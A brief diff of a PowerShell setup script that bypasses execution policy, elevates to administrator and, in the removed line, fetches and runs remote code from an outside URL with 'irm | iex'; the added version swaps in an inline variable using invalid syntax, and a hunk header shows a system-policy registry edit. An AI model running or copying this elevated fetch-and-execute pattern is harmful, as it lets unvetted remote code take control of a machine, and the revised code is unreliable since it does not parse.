@@ -1,8 +1,8 @@
 
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-Start-Process powershell -Verb runAs { irm https://seulink.net/MZTOOL | iex }
-<#    
+Start-Process powershell -Verb runAs { irm @RUN | iex }
+@RUN = "
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
 $TOOL = "C:\TOOL"
@@ -120,4 +120,4 @@ REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Enable
 
 exit
 
-}#>
+}"
